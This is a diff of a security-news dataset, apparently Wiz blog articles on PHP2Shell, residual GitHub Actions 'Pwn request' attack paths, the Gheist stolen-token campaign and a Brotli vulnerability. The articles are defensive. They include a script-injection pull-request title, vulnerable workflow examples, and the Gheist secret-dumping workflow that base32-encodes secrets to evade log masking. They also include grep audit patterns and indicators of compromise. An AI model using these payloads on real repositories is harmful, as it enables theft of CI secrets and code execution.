@@ -957,7 +957,7 @@ Attacks can scale beyond the limits of human operators. A key constraint on offe
 More capable doesn't necessarily mean more stealthy. AI agents can make mistakes, generate broken tooling, pursue dead ends, or misinterpret results. Their iterative approach can also produce a broad trail of observable activity as they probe environments, execute commands, and adjust to what they find. These behaviors are not guaranteed to make an attack easier to detect, but they create opportunities for defenders with the right visibility and behavioral detections. The challenge is to distinguish agentic attack activity from legitimate automation, connect individual signals into a coherent picture, and respond effectively before the attack can escalate further.
 
 AI can accelerate defense, but readiness is what makes it effective. When an attack can move faster, from initial access to broad compromise, security teams cannot rely on manual investigation and response alone. AI can help investigate alerts, correlate activity, establish the blast radius, identify compromised credentials and affected systems, and accelerate containment. But these capabilities are only as effective as the visibility, context, and response processes behind them. Defenders still need to reduce exposed attack surface, prioritize exploitable risks, maintain visibility across their environments, and establish clear containment and remediation workflows before an incident occurs. As outlined in our AI Threat Readiness Framework, the goal is to build the visibility and speed of action needed to respond effectively as attacks accelerate."
-0b1b6e091912,72375819775f,2026-10-27 13:21 UTC,Vulnerabilities & Patching,Wiz,Wiz Blog,Vulnerability Management; Threat and Exposure Management,Article,PHP2Shell: Exploitation Attempts and Remediation Trends,https://www.wiz.io/blog/php2shell-exploitation-so-far,"When only one worker was available the exploit attempted heap-shaping by sending requests containing 1,001 fields of 3,000 bytes each","Last week, we published a report describing two major vulnerabilities in PHP (CVE-2026-109618, CVE-2026-109619). Since then, alongside much of the security industry, the Wiz Research team has been monitoring for related activity in the wild and reviewing publicly available exploit code. So far, we have observed a limited number of exploitation attempts in our telemetry and have not identified a publicly available proof of concept (PoC) demonstrating complete, general end-to-end exploitation against an arbitrary target. Some partners have, however, privately disclosed to us exploits that work against a variety of targets and we continue to experiment internally. Videos demonstrating our successful exploitations are available at php2shell.com.
+0b1b6e091912,2b62329cc6f4,2026-10-27 13:21 UTC,Vulnerabilities & Patching,Wiz,Wiz Blog,Vulnerability Management; Threat and Exposure Management,Article,PHP2Shell: Exploitation Attempts and Remediation Trends,https://www.wiz.io/blog/php2shell-exploitation-so-far,"When only one worker was available the exploit attempted heap-shaping by sending requests containing 1,001 fields of 3,000 bytes each","Last week, we published a report describing two major vulnerabilities in PHP (CVE-2026-109618, CVE-2026-109619). Since then, alongside much of the security industry, the Wiz Research team has been monitoring for related activity in the wild and reviewing publicly available exploit code. So far, we have observed a limited number of exploitation attempts in our telemetry and have not identified a publicly available proof of concept (PoC) demonstrating complete, general end-to-end exploitation against an arbitrary target. Some partners have, however, privately disclosed to us exploits that work against a variety of targets and we continue to experiment internally. Videos demonstrating our successful exploitations are available at php2shell.com.
 
 This post summarizes what we have observed in terms of remediation efforts and exploitation attempts across real world environments and in our own honeypot data to date and shares findings from our ongoing investigation into these activities.
 
@@ -1146,7 +1146,291 @@ IPv4
 2026-10-26
 
 Scanner + exploitation attempt (VPN)"
-df78d51c4365,df78d51c4365,2026-10-25 14:46 UTC,Vulnerabilities & Patching,Wiz,Wiz Blog,Vulnerability Management,Article,Broccoli2shell: Everything You Need To Know About The Critical Brotli Decoder Vulnerability,https://www.wiz.io/blog/cve-2026-111497-brotli-rce-node-js,"A critical vulnerability, tracked as CVE-2026-111497 and referred to as Broccoli2Shell, has been identified in the Brotli decompression library","A critical vulnerability, tracked as CVE-2026-111497 and referred to as Broccoli2Shell, has been identified in the Brotli decompression library. The vulnerability affects multiple widely used technologies, including Node.js, Bun, Envoy Proxy, and more. Successful exploitation could allow an unauthenticated remote attacker to trigger memory corruption, disclose sensitive information, crash affected processes, or potentially achieve remote code execution (RCE).
+9a164148d99c,9a164148d99c,2026-10-26 13:24 UTC,General Security News,Wiz,Wiz Blog,Code Security; Compliance Management,Article,The Pwn Request Reckoning: What Still Works Against GitHub Actions,https://www.wiz.io/blog/github-actions-security-pwn-request-reckoning,"Checkout protections, read-only cache tokens, and event policies close the paths that made exploitation trivial","For years, pull_request_target has been the canonical Pwn request vector: a workflow trigger that runs with repository secrets, yet can be triggered by anyone who opens a pull request from a fork. In 2026, GitHub responded with platform changes that make the default-case exploit significantly harder..
+
+These changes represent real progress. Checkout protections, read-only cache tokens, and event policies close the paths that made exploitation trivial. But they don't eliminate the vulnerability class. They shift it. Attackers who previously exploited any pull_request_target workflow now need to find explicit opt-ins, outdated checkout versions, unprotected triggers, or script injection.
+
+In Part 1 of our GitHub Actions research, we laid out the threat model and core defenses, and Part 2 covered AI-powered actions. This post updates that threat model for 2026: what GitHub's changes actually protect against, where the gaps remain, and how defenders need to adjust. The audit checklist at the end covers what to look for in your own workflows.
+
+The 2026 Security Overhaul: Timeline of Changes
+
+Recognizing the endemic risk posed by Pwn requests, GitHub spent 2026 systematically closing the gap through a phased rollout of platform-level protections and action updates.
+
+Date
+
+Milestone & Action Taken
+
+June 18, 2026
+
+Release of actions/checkout@v7.0.0, blocking fork code checkouts by default in untrusted triggers (pull_request_target, and workflow_run triggered by pull requests).
+
+June 26, 2026
+
+GitHub introduces read-only cache tokens at the platform level for untrusted triggers, preventing cache poisoning attacks.
+
+July 20, 2026
+
+Backported fork checkout protections across all active major versions of actions/checkout (v2.8.0, v3.7.0, v4.4.0, v5.1.0, and v6.1.0; v1 excluded). Workflows referencing mutable version tags (e.g., @v4) inherit these defenses automatically.
+
+September 10, 2026
+
+Fine-grained cache controls via cache-mode reached General Availability (GA).
+
+September 17, 2026
+
+Workflow Execution Protections reached GA, enabling fine-grained event policies and actor rules.
+
+December 2, 2026
+
+[Scheduled] GitHub begins enforcing the default event policy that blocks pull_request_target in public repositories without an explicit event policy. The rule has been in evaluate mode since September 17. Private and internal repositories are not affected.
+
+Residual Risk: What Still Works
+
+While this sequence of platform updates significantly strengthens default security configurations for GitHub Actions, they don't remove all risk.
+
+The December 2 enforcement is a default, not a ban. Maintainers whose automation depends on pull_request_target (labelers, preview deploys, fork CI with secrets) will add an event policy that allows it. Those are exactly the workflows that handle untrusted input with elevated privileges. The default policy also doesn't apply to private and internal repositories or to workflow_run. The rest of this section covers how these surviving workflows can still be exploited.
+
+SHA Pinning: The Security Paradox
+
+One of the most disconcerting findings in our research is how standard supply chain hardening advice - specifically pinning actions to exact commit SHAs - can inadvertently bypass GitHub's platform defenses.
+
+# ""Security-hardened"" workflow: SHA-pinned for supply chain safety - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0
+
+Because GitHub's backported protections rely on logic embedded within actions/checkout itself, pinning to SHA values prior to the July 20, 2026 backport release means the workflow runs legacy code without any safety checks. Our empirical testing across workflow triggers confirmed this discrepancy: referencing mutable tags like @v4 (resolving to v4.4.x) or pinned versions such as @v4.4.0 remain protected, whereas older versions like @v4.3.0 or SHA-pinned references to legacy releases (such as @08eba0b... resolving to v4.3.0) offer no protection.
+
+To maintain protection, security teams using SHA pinning must ensure their refs are updated to match or exceed the minimum patched release versions: v2.8.0, v3.7.0, v4.4.0, v5.1.0, v6.1.0, or v7.0.0+.
+
+Custom Checkout Scripts and Third-Party Actions
+
+A second gap concerns workflows that bypass actions/checkout altogether. GitHub's protections are implemented within the action's code - any alternative method of fetching code operates unrestricted. Direct CLI invocations sidestep protections entirely:
+
+- env: GH_TOKEN: ${{ github.token }} PR_REPO: ${{ github.event.pull_request.head.repo.full_name }} PR_SHA: ${{ github.event.pull_request.head.sha }} PR_NUMBER: ${{ github.event.pull_request.number }} run: | # Any one of these fetches fork code without actions/checkout's protections # Bypass 1: Direct git clone git clone ""https://github.com/${PR_REPO}"" pr-code && git -C pr-code checkout ""${PR_SHA}"" # Bypass 2: gh pr checkout (runs in the base repo's workspace) gh pr checkout ""${PR_NUMBER}"" # Bypass 3: gh repo clone gh repo clone ""${PR_REPO}"" fork-code
+
+Third-party checkout actions implement their own git logic, so they don't inherit these protections. Any of them configured with a PR head ref will check out fork code unrestricted.
+
+Unprotected Privileged Triggers
+
+GitHub's checkout protections only cover pull_request_target and workflow_run:
+
+Pwn requests triggered in other event types besides pull_request_target (such as issue_comment) will not be blocked by this change. Further hardening of additional events may be explored in future releases.
+
+GitHub changelog
+
+This creates an inconsistent security boundary: GitHub's cache controls explicitly treat issue_comment as a low-trust trigger, while checkout protections do not. Workflows using issue_comment for bot commands (/deploy, /test, /cherry-pick) remain fully exploitable with checkout v7 - no allow-unsafe-pr-checkout flag required:
+
+on: issue_comment: types: [created] jobs: deploy: if: github.event.issue.pull_request && contains(github.event.comment.body, '/deploy') runs-on: ubuntu-latest steps: - uses: actions/checkout@v7 with: ref: refs/pull/${{ github.event.issue.number }}/merge # Checks out fork PR code
+
+Other privileged triggers have the same gap. repository_dispatch also runs with secrets, and it's exploitable when a workflow uses attacker-influenced payload data to choose a checkout ref.
+
+Until GitHub extends checkout protections, these workflows have to enforce their own authorization, and it needs to hold from the moment the event fires until the code runs:
+
+- Verify who triggered it. For comment commands, check the commenter's actual repository permission (getCollaboratorPermissionLevel, write or above). Don't rely on author_association, which doesn't reflect current permissions. For repository_dispatch, limit who holds a token that can send the event, and don't treat the payload as proof of who sent it.
+
+- Pin what was approved. refs/pull/N/merge is mutable, so an attacker can push a malicious commit after a maintainer comments /deploy. Check out the exact head SHA, and abort if the PR was updated after the comment was posted.
+
+- Treat the event payload as untrusted input. Validate comment arguments and dispatch payload fields against a strict, anchored allowlist regex, and pass them to the shell through environment variables, never through ${{ }} interpolation.
+
+Script Injection: Pwn Request Without Checkout
+
+A common misconception is that pull_request_target vulnerabilities require checking out fork code. In reality, attackers can achieve code execution without any checkout step, through script injection.
+
+When workflow authors interpolate event context directly into shell commands using ${{ }} expressions, GitHub substitutes the value into the script before the shell runs, so attacker-controlled data becomes part of the command itself:
+
+on: pull_request_target jobs: greet: runs-on: ubuntu-latest steps: - run: echo ""Thanks for PR: ${{ github.event.pull_request.title }}""
+
+An attacker simply crafts a pull request with a malicious title:
+
+""; touch /tmp/pwned; echo INJECTED #
+
+The quote closes the string, the semicolon ends the echo, and everything after it runs as a new command with the job's secrets and token. None of GitHub's 2026 changes touch this: there is no checkout to block, and the vulnerability lies in how the workflow handles untrusted input.
+
+The fix is to never interpolate untrusted input into a script. Pass it through an environment variable instead, so the shell treats it as data:
+
+- env: PR_TITLE: ${{ github.event.pull_request.title }} run: echo ""Thanks for PR: $PR_TITLE""
+
+The double quotes around $PR_TITLE matter. Without them, the shell still word-splits and glob-expands the value.
+
+Persistent Data Channels: Beyond Cache Tokens
+
+GitHub's read-only cache tokens protect the Actions cache service, but workflows can still exchange data through channels that remain unaffected.
+
+Artifact Poisoning
+
+The upload-artifact and download-artifact actions operate independently of cache tokens. The classic attack chain uses an unprivileged pull_request workflow to upload attacker-controlled build outputs, then a privileged workflow_run to download and execute them:
+
+# .github/workflows/build.yml - unprivileged, runs the fork's code name: Build on: pull_request jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v7 - run: npm ci && npm run build # Attacker-controlled - uses: actions/upload-artifact@v4 with: name: build-output path: ./dist/ # .github/workflows/deploy.yml - privileged, has secrets name: Deploy Preview on: workflow_run: workflows: [""Build""] types: [completed] jobs: deploy: if: github.event.workflow_run.conclusion == 'success' runs-on: ubuntu-latest steps: - uses: actions/download-artifact@v4 with: name: build-output path: ./dist/ run-id: ${{ github.event.workflow_run.id }} # Fetches the fork run's artifact github-token: ${{ secrets.GITHUB_TOKEN }} - run: ./dist/deploy.sh # Executes attacker-controlled file env: DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }} # Exposed to attacker code
+
+This is exactly the workflow_run scenario checkout v7 was built to block, and it doesn't help here. The privileged workflow never checks out fork code; it downloads it. Unlike cache entries, there's no platform equivalent that marks artifacts from untrusted runs as tainted, so any workflow that downloads and executes artifacts from a less-trusted run inherits the risk.
+
+Self-Hosted Runner State
+
+On non-ephemeral self-hosted runners, filesystem state persists between jobs. Local package manager caches (~/.npm, ~/.cache/pip), build directories, and installed tools live on the runner's disk, outside the Actions cache service, so read-only cache tokens don't cover them. Attacker code running under an untrusted trigger can write to these locations and poison the next trusted workflow scheduled on the same machine, including release and publish jobs. Use ephemeral runners, which are wiped after each job, for any workflow that untrusted events can trigger, and keep untrusted and trusted workflows in separate runner groups.
+
+The Misconception That Won't Die
+
+Many security teams believe they have another safeguard in place: the ""Require approval for all external contributors"" setting under Settings -> Actions -> General. If enabled, fork PRs need maintainer approval before workflows run. Problem solved, right?
+
+Not quite. That setting only gates pull_request workflows, which run the fork's own workflow YAML. For pull_request_target, GitHub considers the workflow definition trusted (it comes from the base repository), so the approval setting doesn't apply and the run starts immediately.
+
+The irony cuts deep: pull_request_target is the more dangerous trigger (secrets access, write tokens), yet it's the one that skips the approval requirement. If a pull_request_target workflow needs a human gate, put the privileged job behind an environment with required reviewers, or restrict who can trigger it with Workflow Execution Protections actor rules.
+
+Explicit Opt-In: allow-unsafe-pr-checkout
+
+Finally, developers who need to interact with fork code can explicitly disable checkout protections by enabling the allow-unsafe-pr-checkout flag:
+
+- uses: actions/checkout@v7 with: ref: ${{ github.event.pull_request.head.sha }} allow-unsafe-pr-checkout: true # Re-enables untrusted fork checkouts
+
+While the parameter name is deliberately alarming, determined development teams or third-party workflows may still employ it to maintain legacy automation, effectively reopening the exact same execution vector as before. Security teams should pay special attention to any use of this flag.
+
+What Changed
+
+To sum up, GitHub's 2026 security rollout deserves credit. Default event policies, checkout protections, and read-only cache tokens make the trivial Pwn request (fork, PR, profit) significantly harder. Starting December 2, pull_request_target will no longer run in public repositories unless an event policy explicitly allows it. Cache poisoning through the Actions cache is mitigated. These are real wins.
+
+But the vulnerability class isn't eliminated. It shifted. What remains exploitable: explicit opt-ins via allow-unsafe-pr-checkout, SHA-pinned versions predating the July 2026 backport, custom checkout scripts that bypass action-level controls, script injection requiring no checkout at all, unprotected triggers like issue_comment and repository_dispatch, artifact poisoning chains from pull_request to workflow_run, persistent state on non-ephemeral self-hosted runners, and private or internal repositories, which the default policy doesn't cover. The attack surface shrinks, but what remains is harder to spot.
+
+What To Do About It
+
+Start by auditing what you already run, then get ahead of the December 2 enforcement.
+
+Audit Your Workflows
+
+Wiz Code automatically scans GitHub Actions workflows for Pwn requests, script injection, version gaps, and risky configurations to cover this residual attack surface. Alternatively, use open-source tools like zizmor or even these basic grep searches to start the audit:
+
+# Flag risky triggers, unsafe checkouts, outdated checkout versions, artifact downloads, # self-hosted runners and event data in expressions (env: usage is safe), then review each hit grep -rnE 'pull_request_target|workflow_run|issue_comment|repository_dispatch|allow-unsafe-pr-checkout|self-hosted|download-artifact|gh (pr checkout|repo clone)|git (clone|fetch)|refs/pull|actions/checkout@v(1|2\.[0-7]|3\.[0-6]|4\.[0-3]|5\.0|6\.0)([^0-9]|$)|\$\{\{[[:space:]]*github\.(event\.|head_ref)' .github/workflows/
+
+In addition, run this script to resolve each SHA to its release tag, then compare against the patched versions:
+
+tags=$(git ls-remote --tags https://github.com/actions/checkout) grep -rhoE ""actions/checkout@[0-9a-f]{40}"" .github/workflows/ | cut -d@ -f2 | sort -u | while read -r sha; do tag=$(echo ""$tags"" | grep ""^$sha"" | sed 's#.*refs/tags/##; s#\^{}$##' | sort -V | tail -1) echo ""$sha ${tag:-UNKNOWN - not a release tag, check manually}"" done
+
+Preparing for the December 2 pull_request_target Enforcement
+
+Starting December 2, the default event policy will block pull_request_target in public repositories that have no explicit event policy. workflow_run is not affected, and neither are private or internal repositories. Before that date:
+
+Check policy insights to see which pull_request_target runs would be blocked.
+
+Decide per workflow whether it actually needs pull_request_target. If not, move it to pull_request. If a privileged follow-up step is still needed, a workflow_run workflow can handle it, but it must treat the PR run's artifacts as untrusted data, never execute them.
+
+For workflows that legitimately need fork access, create an explicit event policy and use workflow file targeting to allow pull_request_target only for those files. Treat every file on that allowlist as high-risk: run it through the audit above before adding it, and re-audit whenever it changes."
+0b5941db5d46,0b5941db5d46,2026-10-25 17:55 UTC,"Attacks, Breaches & Threat Intel",Wiz,Wiz Blog,Code Security; Identity Security Posture Management,Article,Gheist: Attempted Scaled Abuse of Stolen GitHub Tokens Stumbles,https://www.wiz.io/blog/gheist-attempted-scaled-abuse-of-stolen-github-tokens-stumbles,As of October 24: the attack is ongoing and evolving roughly ⅔ of implicated accounts are no longer available on GitHub,"Since September 15, 2026, Wiz Research has been tracking Gheist: a new campaign performing mass abuse of compromised GitHub tokens. The attack commits a workflow named sync-check to every repository to which each token has access. The workflow seeks to print the repository's secrets into its own workflow log. Then, the tool downloads the log through the GitHub API and deletes the run seconds later. The tool's API requests carry the user agent gheist, which gives the campaign its name.
+
+We have recovered more than 13,500 planted branches from more than 850 compromised accounts, ranging from personal projects to enterprise organizations' private repositories.
+
+A recent GitHub control has been blocking the exploitation in public repositories, but we've observed successful exploitation and follow-on activity in private repositories and GitHub enterprise environments.
+
+As of October 24:
+
+the attack is ongoing and evolving
+
+roughly ⅔ of implicated accounts are no longer available on GitHub. This likely indicates response activity, as we have reported this activity to GitHub.
+
+How the attack works
+
+For each repository, the tool creates a branch named ci-sync- plus six random characters, then commits .github/workflows/sync-check.yml with the message ci: sync config. The commit is unsigned and authored as the token's owner. The push event triggers the workflow:
+
+name: sync-check on: [push] permissions: {} jobs: sync: runs-on: ubuntu-latest timeout-minutes: 6 steps: - name: build run: | env | base32 -w 120 echo -n '${{ toJSON(secrets) }}' | base32 -w 120
+
+Three details make it work:
+
+GitHub masks secret values in logs only when they appear verbatim. A base32-encoded secret doesn't match, so it prints in full.
+
+While permissions: {} restricts the job's GITHUB_TOKEN, which the attacker doesn't need, it doesn't restrict the secrets context.
+
+When a repository has deployment environments, the tool lists them in a job matrix with environment: ${{ matrix.environment }}, so environment-scoped secrets, often production credentials, are printed too.
+
+Because the secrets leave through GitHub's own API, there is no attacker domain or outbound connection to block.
+
+In enterprise organizations, we saw the tool cycle through tokens of several users and automation accounts within minutes, clone private repositories before planting the workflow, and hours later, cloud credentials from the same organization used to enumerate AWS Secrets Manager.
+
+How the payload evolved
+
+Two variants of this attack have been observed in parallel. They can be distinguished via the branch names.
+
+Tool A uses a hexadecimal suffix and the plain payload.
+
+Tool B uses a base36 suffix, added timeout-minutes: 6 and the environment matrix within hours of its first run on September 28, and modifies the selected payload per repository.
+
+On October 19, Tool B added echo X | base32 -w 120 between the dumps, which prints LAFA==== as a separator, likely for the operator's log parser. Hours later it pushed a second job, sync-host, with runs-on: self-hosted, apparently only to repositories with a registered self-hosted runner. It writes three helper files (.gdmp_pat, .gdmp_patg, .gdmp_sweep) and logs each stage under a ===== gdmp-pivot: <stage> ===== header:
+
+Host details and crontab.
+
+A recursive search of the home directory, workspace and system paths for 31 token formats (including keys for AI providers such as Anthropic, Hugging Face, Groq and NVIDIA), private keys, .env files, Terraform state and shell history.
+
+The environment of every process, from /proc/*/environ.
+
+Through the Docker socket, a container with the host's root filesystem mounted, to repeat the search on the host.
+
+AWS instance-role credentials, plus GCP and Azure metadata.
+
+GitHub Actions and GitLab runner credential files.
+
+The Kubernetes service account token.
+
+However, this job is buggy: it looks for the wrong runner key file, its URL-credential regex is broken, and it doesn't collect GCP or Azure tokens.
+
+GitHub's approval hold and private repositories
+
+Since July 28, 2026, GitHub has held potentially malicious workflow runs in public repositories until a collaborator approves them. Every public Gheist run we checked, across all variants including the self-hosted job, sits at action_required. The control worked, and the malicious payloads never ran.
+
+Unfortunately, that hold doesn't apply to private repositories or GitHub Enterprise Server. There, GitHub audit logs show runs on ci-sync-* branches completing and then being deleted by the gheist user agent. CloudTrail shows the organizations' own workflows running on those branches and assuming AWS roles, which proves Actions executed without approval.
+
+For defenders, that last signal finds Gheist without any GitHub logs, as shown below.
+
+Other activity on the same accounts
+
+This campaign is leveraging compromised GitHub access. The same accounts are used by other actors and campaigns, which demonstrates how compromised credentials can move throughout the threat actor ecosystem. We've observed overlaps with the following campaigns:
+
+Lure repositories (malware distribution). On October 6, 391 accounts renamed about 1,461 repositories to cracked-software lures like fl-studio-crack and solana-sniper-lite. The rename wiped 610 ci-sync branches as a side effect. 166 of these accounts never appear in Gheist activity, so the pool is larger than Gheist's footprint.
+
+Free compute. On October 18, 25 Gheist accounts each created a ""Windows RDP Runner"" repository within nine minutes, attempting to abuse GitHub Actions for free compute cycles.
+
+PolinRider. Some victims appear to be infected with PolinRider, the DPRK-linked malware that hides JavaScript in build config files and force-pushes back-dated commits. On October 19 and 20, three victims re-pushed their Gheist commits with a loader appended to vite.config.js behind hundreds of whitespace characters, and in two cases an api.js that package.json runs before every dev and build.
+
+Megalodon. 57 accounts from Gheist's first phase were also victims of Megalodon in May.
+
+The credential sources we could trace fit this picture: infostealer logs, and tokens exposed in earlier supply-chain compromises such as the Trivy compromise in March.
+
+Note: Gheist is distinct from GhostAction, which uses different workflow files and exfiltrates secrets to 193.32.204[.]199.
+
+Which actions should security teams take?
+
+Hunt
+
+Look for branches named ci-sync- followed by six random characters, where the only change is a new file at .github/workflows/sync-check.yml with the commit message ci: sync config.
+
+In GitHub audit logs, look for workflow runs on ci-sync-* branches that were deleted within a minute of completing, and for any activity from the user agent gheist.
+
+If your workflows authenticate to the cloud with OIDC, check cloud audit logs for role assumptions or token exchanges whose subject includes a ci-sync- branch. That shows GitHub Actions ran on an attacker branch, even if you don't collect GitHub logs.
+
+On self-hosted runners, look for the files .gdmp_pat, .gdmp_patg and .gdmp_sweep, and the string gdmp-pivot in job logs.
+
+Respond
+
+Rotate every repository, organization and environment secret available to an affected repository. Deleting the run or the branch doesn't undo the exposure.
+
+Revoke the tokens that pushed the commits, and check their owners' devices for infostealers.
+
+If a ci-sync branch ran on a self-hosted runner, treat the host and its instance role as compromised.
+
+Don't approve held sync-check runs, and don't run code from ci-sync branches.
+
+Harden. Require reviewers on environments with production secrets, scope OIDC trust policies to protected branches or environments, use GitHub Apps or short-lived fine-grained tokens instead of personal access tokens, and run self-hosted runners as ephemeral hosts without Docker socket or unrestricted metadata access.
+
+Indicators of compromise
+
+User agent gheist
+
+Branch ci-sync- followed by six characters, matching ^ci-sync-[0-9a-z]{6}$
+
+Commit message ci: sync config adding only .github/workflows/sync-check.yml
+
+Markers toJSON(secrets) }}' | base32 -w 120 and ===== gdmp-pivot:; files .gdmp_pat, .gdmp_patg, .gdmp_sweep
+
+Workflow blob SHAs: f3da2b8b357dcda02fd455d314be2a95007516a6 (plain), d09535857a741bbb976bdc084a9a021713133291 (timeout), 1dc5af9cce950aad1eb1546ecce8565b117540c4 (separator), c665b778b2d822453293003e7ca0bbb2cb08e39d (self-hosted job). Environment-matrix variants differ per repository.
+
+How can Wiz help?
+
+The Threat Center advisory includes an Event Explorer query covering planted commits, Gheist activity in GitHub audit logs and cloud role assumptions from attacker branches. Wiz Defend detects the activity with rules including ""New Workflow Completed And Deleted In Short Time Span"", ""Workflow Pushed With Secret Dump"" and ""Commit Created With Known Malicious Commit Message""."
+df78d51c4365,15b5fe82f315,2026-10-25 14:46 UTC,Vulnerabilities & Patching,Wiz,Wiz Blog,Vulnerability Management,Article,Broccoli2shell: Everything You Need To Know About The Critical Brotli Decoder Vulnerability,https://www.wiz.io/blog/cve-2026-111497-brotli-rce-node-js,"A critical vulnerability, tracked as CVE-2026-111497 and referred to as Broccoli2Shell, has been identified in the Brotli decompression library","A critical vulnerability, tracked as CVE-2026-111497 and referred to as Broccoli2Shell, has been identified in the Brotli decompression library. The vulnerability affects multiple widely used technologies, including Node.js, Bun, Envoy Proxy, and more. Successful exploitation could allow an unauthenticated remote attacker to trigger memory corruption, disclose sensitive information, crash affected processes, or potentially achieve remote code execution (RCE).
 
 Organizations using affected components to decompress untrusted Brotli-compressed data are advised to prioritize remediation.
 
@@ -1549,6 +1833,177 @@ Boto3/1.43.112 md/Botocore#1.43.112 ua/2.1 os/linux#6.8.0-147-generic md/arch#x8
 User Agent (aws-cli 1.46.1)
 
 aws-cli/1.46.1 md/Botocore#1.43.62 ua/2.1 os/linux#6.8.0-147-generic md/arch#x86_64 lang/python#3.12.14 md/pyimpl#CPython m/b,Z,D cfg/retry-mode#legacy botocore/1.43.62"
+6cf592ec120b,2b62329cc6f4,2026-10-21 13:59 UTC,Vulnerabilities & Patching,Wiz,Wiz Blog,Vulnerability Management; AI Security,Article,PHP2Shell: AI uncovers critical RCE vulnerabilities affecting 70% of the Internet,https://www.wiz.io/blog/php2shell-php-rce,Core PHP engine flaws enable remote code execution and Heartbleed-style memory disclosure across the web.,"Executive Summary
+
+Wiz Research uncovered multiple critical vulnerabilities in core PHP, a popular general-purpose scripting language that powers 70% of all websites in the world. Successful exploitation could allow attackers to take control of affected servers, steal sensitive data, and deface the websites running on them.
+
+PHP is a backbone of the web: it’s the programming language powering WordPress, Joomla, Drupal, Wikipedia’s MediaWiki, and many others.
+
+These vulnerabilities include memory disclosure and unauthenticated remote code execution in PHP itself, independent of the application running on top of it, putting every affected website in immediate risk.
+
+Every PHP version released in the last decade is affected by at least one of these vulnerabilities, going back to version 5.4. Attackers can exploit them remotely, in some cases fairly easily. Immediate patching is strongly advised.
+
+On October 21, 2026, PHP released the patch fixing multiple memory-safety vulnerabilities in the core engine.
+
+These findings rank among the most severe vulnerabilities discovered in PHP, and arguably in software history. The underlying flaws had been present for decades, but demonstrating their exploitability required an exceptionally complex chain of steps, at the edge of what human researchers could practically achieve. Frontier AI models substantially reduced that barrier, turning a longstanding flaw into an exploit.
+
+Overview
+
+In this post, we explain how frontier AI helped us find and fix vulnerabilities that had remained hidden in the PHP codebase for more than a decade. The issues described below all stem from key architecture decisions, some made over a decade ago, and were grouped under two CVEs, with severity reaching CVSS 9.2. The work grew into a cross-industry effort to protect customers, find variants, deploy detections and mitigations, and verify a patch in time for coordinated disclosure.
+
+Nearly every PHP version is affected by at least one of these issues, including releases dating back to PHP 5.4. The vulnerabilities can allow unauthenticated attackers to execute code on affected servers or read sensitive process memory. That memory may contain passwords, authentication tokens, API keys and certificates belonging to other requests or the server itself.
+
+PHP is the programming language behind much of the web, powering WordPress, Drupal and MediaWiki, the software that runs Wikipedia. A flaw in its core engine can affect websites across this ecosystem, even when their own application code is secure.
+
+Some vulnerabilities become turning points because they challenge fundamental assumptions about security. In 2014, Heartbleed exposed the fragility of shared infrastructure securing the internet. In 2021, Log4Shell revealed how deeply embedded software dependencies could create widespread exposure that organizations struggled to identify. We believe PHP2Shell could mark a similar turning point for the AI era, illustrating how AI can change the practical exploitability of longstanding vulnerabilities. Building the exploit required chaining multiple flaws and adapting to each target’s memory layout through repeated testing and debugging. Frontier models were critical to making this process practical, enabling us to develop and adapt working exploits across multiple applications in hours. As the time and expertise required for this work decrease, complexity may no longer provide a meaningful barrier, changing how we define what is vulnerable in practice.
+
+Wiz Research would like to thank the PHP team, Calif and OpenAI for their work on discovery, coordination and patch verification. OpenAI and Calif also published blogs containing details on the vulnerability – its history, technical details, and insight into the disclosure process. PHP posted as well.
+
+We’d also like to express our sincere gratitude towards Automattic, Akamai, AWS, Cloudflare, Fastly, Google, Imperva, Microsoft, Vercel, and many others, for helping prepare guidance and out-of-the-box mitigations for customers who cannot apply the patch immediately.
+
+The Vulnerabilities
+
+All of the disclosed vulnerabilities are memory-safety issues that stem from bugs in how PHP handles fatal errors while processing requests, particularly out-of-memory errors. These bugs can leave a corrupted internal PHP state behind after a request ends unexpectedly. A later request or worker can reuse that stale state, leading to memory disclosure or corruption.
+
+Below you can find a table that demonstrates what type of impact was demonstrated by each of the bugs we reported to PHP. The applications listed below are targets we chose for the RCE demonstrations. They are representative targets - exploitation does not require one of these CMSs, as the vulnerable code is in PHP itself.
+
+Tracking ID
+
+Bug
+
+What an attacker can achieve
+
+What we demonstrated
+
+CVE-2026-109618
+
+Upload-progress unserializer use-after-free
+
+Remote process-memory disclosure
+
+Corrupt process memory and execute code
+
+Unauthenticated disclosure of PHP worker memory
+
+Pre-authentication RCE on WordPress, Drupal and Joomla
+
+Application-agnostic remote memory disclosure
+
+CVE-2026-109619
+
+Fatal-error backtrace use-after-free
+
+OPcache type confusion
+
+Corrupt process memory and execute code
+
+Corrupt shared PHP state and execute code
+
+Pre-authentication RCE on Drupal
+
+Pre-authentication RCE on WordPress
+
+While this blog covers only four instances of exploitable bugs (grouped under two CVEs) that follow this problematic pattern, there are other tracked, and likely untracked, variants of this issue in the PHP codebase. These variants have different requirements for exploitation and can lead to different types of impact. In any case, the patch provided by the PHP team fixes the issue at its core and eliminates all variants in the patched release.
+
+Impact
+
+We combined these vulnerabilities into a single exploit script, php2shell, and demonstrated that it could execute code remotely without authentication on deployments of WordPress (wordpress:latest), Drupal (drupal:latest), and Joomla (joomla:latest), using their latest container images at the time of testing.
+
+These platforms illustrate the impact, but the vulnerabilities are in PHP itself. Exploitation does not depend on a flaw in the application’s code: even a simple “Hello World” application running on an affected PHP version can be vulnerable.
+
+Separately, we demonstrated that attackers could read sensitive data from the PHP process’s memory, including passwords, tokens, and API keys, without needing to achieve remote code execution.
+
+Demonstrations of PHP2Shell with Wordpress, Joomla, and Drupal:
+
+The AI inflection point
+
+The vulnerable code had been present for more than a decade. Turning these flaws into working exploits required chaining multiple bugs and accounting for how PHP allocates and reuses memory across requests. Memory bugs are notoriously complex; differences in PHP versions, configurations and application behavior can break assumptions the exploit depends on. An attack that works against one deployment may need substantial adjustments to work against another, each requiring further analysis, testing and debugging. Pre-AI, this manual work would be difficult to implement and even harder to scale.
+
+With AI this is no longer a barrier. LLMs can help adapt an exploit to different PHP versions, configurations and memory layouts. With testing and debugging tools, models can analyze failures and iterate on adjustments, reducing the specialist effort required for each target. This significantly lowers the barrier to scaling attacks across different deployments.
+
+This changes the economics of both discovery and exploitation. As AI reduces the effort needed to develop and adapt complex exploits, vulnerabilities that once seemed impractical to exploit become viable targets.
+
+We used Wiz Atlas, Gemini 4 Argon and GPT-5.6 Sol throughout this research. Notably, Gemini 4 Argon made an invaluable contribution to finding the vulnerability, exploit development, attack detection, and validation of the patch.
+
